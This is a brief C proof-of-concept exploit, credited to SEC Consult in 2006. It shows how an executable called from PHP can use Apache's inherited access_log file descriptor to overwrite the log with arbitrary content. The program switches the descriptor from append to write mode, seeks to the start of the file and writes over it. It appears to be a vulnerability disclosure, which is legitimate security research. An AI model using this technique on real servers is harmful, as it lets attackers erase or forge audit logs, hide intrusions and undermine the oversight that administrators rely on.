# apache's access_log can be overwritten with arbitrary content
# from PHP called executables.
# POC by frauk\x41ser && sk0L / SEC Consult 2006

#include <unistd.h>
#include <fcntl.h>

#define LOGFD 7

void main(){
        fcntl(LOGFD, F_SETFL, O_WRONLY); // change mode from append to write
        lseek(LOGFD, 0, SEEK_SET); // reposition to start of file
        write(LOGFD,"hehe\n",5);
}

